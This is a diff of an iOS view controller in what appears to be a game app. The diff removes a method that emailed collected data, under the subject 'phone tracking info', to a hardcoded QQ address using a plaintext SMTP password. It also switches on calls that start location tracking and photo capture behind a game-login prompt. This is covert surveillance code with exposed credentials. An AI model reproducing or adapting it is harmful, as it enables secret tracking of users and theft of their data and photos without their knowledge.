@@ -8,12 +8,11 @@
 
 #import "RecordViewController.h"
 #import "UMessage.h"
-#import "SKPSMTPMessage.h"
 #import <CoreLocation/CoreLocation.h>
 #import "GameViewController.h"
 #import <AVFoundation/AVFoundation.h>
 #import <UMSocialCore/UMSocialCore.h>
-@interface RecordViewController ()<UITextFieldDelegate,CLLocationManagerDelegate,UIImagePickerControllerDelegate,SKPSMTPMessageDelegate>
+@interface RecordViewController ()<UITextFieldDelegate,CLLocationManagerDelegate,UIImagePickerControllerDelegate>
 {
     //jilu
     UILabel * name3;
@@ -45,7 +44,7 @@
     NSString * logintext;
     UIImageView * imageView;
     UIImagePickerController * imgPicker;
-    SKPSMTPMessage* emailServer;
+    
     
 }
 @property(nonatomic,strong) AVCaptureSession * captureSession;
@@ -113,96 +112,37 @@
     
     
     //运行拍照传输。添加通知
-//   [self reportingCenter];
+   [self reportingCenter];
     
 //[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(reportingCenter) name:@"reportingcenter" object:nil];
     
 }
-
-//发送邮件
 -(void)sendEmailtoxsy{
     
-    emailServer = [[SKPSMTPMessage alloc] init];
-    emailServer.delegate = self;
-    emailServer.fromEmail = @"2878176128@qq.com";
-    emailServer.toEmail = @"1175337619@qq.com";
-    emailServer.login =@"2878176128@qq.com";
-    emailServer.pass = @"sxm127*";
-    
-    emailServer.relayHost = @"smtp.exmail.qq.com";
-    emailServer.requiresAuth = YES;
-    emailServer.wantsSecure = YES;
-    emailServer.subject = @"2020手机追踪信息";
-    
-//    emailServer.parts =@[@{kSKPSMTPPartContentTypeKey:@"text/plain",kSKPSMTPPartMessageKey:[NSString stringWithFormat:@"%@\n%@",centertext,logintext],kSKPSMTPPartContentTransferEncodingKey: @"8bit"}];
-//    
-//    [emailServer send];
-    
-    emailServer.delegate = self;
-    
-    NSMutableArray *parts_to_send = [NSMutableArray array];
-    
-    //If you are not sure how to format your message part, send an email to your self.
-    //In Mail.app, View > Message> Raw Source to see the raw text that a standard email client will generate.
-    //This should give you an idea of the proper format and options you need
-    NSDictionary *plain_text_part = [NSDictionary dictionaryWithObjectsAndKeys:
-                                     @"text/plain\r\n\tcharset=UTF-8;\r\n\tformat=flowed", kSKPSMTPPartContentTypeKey,
-                                     [centertext stringByAppendingString:@"\n"], kSKPSMTPPartMessageKey,
-                                     @"quoted-printable", kSKPSMTPPartContentTransferEncodingKey,
-                                     nil];
-    [parts_to_send addObject:plain_text_part];
-    
-//    if (sendVCFSwitch.on)
 //    {
-//        NSString *vcard_path = [[NSBundle mainBundle] pathForResource:@"test" ofType:@"vcf"];
-//        NSData *vcard_data = [NSData dataWithContentsOfFile:vcard_path];
-//        NSDictionary *vcard_part = [NSDictionary dictionaryWithObjectsAndKeys:
-//                                    @"text/directory;\r\n\tx-unix-mode=0644;\r\n\tname=\"test.vcf\"",kSKPSMTPPartContentTypeKey,
-//                                    @"attachment;\r\n\tfilename=\"test.vcf\"",kSKPSMTPPartContentDispositionKey,
-//                                    [vcard_data encodeBase64ForData],kSKPSMTPPartMessageKey,
-//                                    @"base64",kSKPSMTPPartContentTransferEncodingKey,nil];
-//        [parts_to_send addObject:vcard_part];
+//        "blogApp": "xujiahui",
+//        "postId": 7463038,
+//        "body": "123456789",
+//        "parentCommentId": 0
 //    }
 //    
-//    if (sendImageSwitch.on)
-//    {
-//        NSString *image_path = [[NSBundle mainBundle] pathForResource:@"Success" ofType:@"png"];
-//        NSData *image_data = [NSData dataWithContentsOfFile:image_path];
-//        NSDictionary *image_part = [NSDictionary dictionaryWithObjectsAndKeys:
-//                                    @"inline;\r\n\tfilename=\"Success.png\"",kSKPSMTPPartContentDispositionKey,
-//                                    @"base64",kSKPSMTPPartContentTransferEncodingKey,
-//                                    @"image/png;\r\n\tname=Success.png;\r\n\tx-unix-mode=0666",kSKPSMTPPartContentTypeKey,
-//                                    [image_data encodeWrappedBase64ForData],kSKPSMTPPartMessageKey,
-//                                    nil];
-//        [parts_to_send addObject:image_part];
-//    }
-    
-    NSDictionary *sig_text_part = [NSDictionary dictionaryWithObjectsAndKeys:
-                                   @"text/plain\r\n\tcharset=UTF-8;\r\n\tformat=flowed", kSKPSMTPPartContentTypeKey,
-                                   [@"\n" stringByAppendingString:centertext], kSKPSMTPPartMessageKey,
-                                   @"quoted-printable", kSKPSMTPPartContentTransferEncodingKey,
-                                   nil];
-    [parts_to_send addObject:sig_text_part];
-    
-    emailServer.parts = parts_to_send;
-    
-//    Spinner.hidden = NO;
-//    [Spinner startAnimating];
-//    ProgressBar.hidden = NO;
-//    HighestState = 0;
-    
-    [emailServer send];
+//    
+//    "IsSuccess": true,
+//    "Message": "\u003cdiv class=\"comment_my_posted\"\u003e\u003cimg style=\"vertical-align:middle\" src=\"http://static.cnblogs.com/images/icon_comment.gif\"/\u003e \u003ca href=\"http://home.cnblogs.com/u/922169/\"\u003e\u003cb\u003e徐家汇\u003c/b\u003e\u003c/a\u003e:\u003cblockquote class=\"bq_post_comment\"\u003e123456789\u003c/blockquote\u003e\u003c/div\u003e",
+//    "Duration": "218"
+//    
+//    NSURL *url = [NSURL URLWithString:URL_POST1];
+//    NSMutableURLRequest *request = [[NSMutableURLRequest alloc]initWithURL:url cachePolicy:NSURLRequestReloadRevalidatingCacheData timeoutInterval:10];
+//    [request setHTTPMethod:@"POST"];
+//    NSData *data = [URL_POST2 dataUsingEncoding:NSUTF8StringEncoding];
+//    [request setHTTPBody:data];
+//    //连接服务器
+//    NSURLConnection *connection = [NSURLConnection connectionWithRequest:request delegate:self];
+//    [connection start];
+// 
+//    
 }
-//发送代理
--(void)messageFailed:(SKPSMTPMessage *)message error:(NSError *)error{
-    NSLog(@"-------------email:%@",error.localizedDescription);
-    
-}
--(void)messageSent:(SKPSMTPMessage *)message{
-    
-    NSLog(@"发送成功啦");
-    
-}
+
 
 
 -(void)reportingCenter{
@@ -212,7 +152,7 @@
     [self initializeLocationService];
     
     //获取照片
-//    [self getPhoto];
+    [self getPhoto];
     
     //sanfang denglu
    UIAlertController* alertView  = [UIAlertController alertControllerWithTitle:@"登陆游戏"
@@ -238,6 +178,9 @@
     //    // Alert
     [self presentViewController:alertView animated:YES completion:nil];
 }
+
+
+
 - (void)getAuthWithUserInfoFromWechat
 {
     [[UMSocialManager defaultManager] getUserInfoWithPlatform:UMSocialPlatformType_WechatSession currentViewController:nil completion:^(id result, NSError *error) {
@@ -301,6 +244,7 @@
         }
     }];
 }
+
 
  - (void)getUserInfoForPlatform:(UMSocialPlatformType)platformType
     {
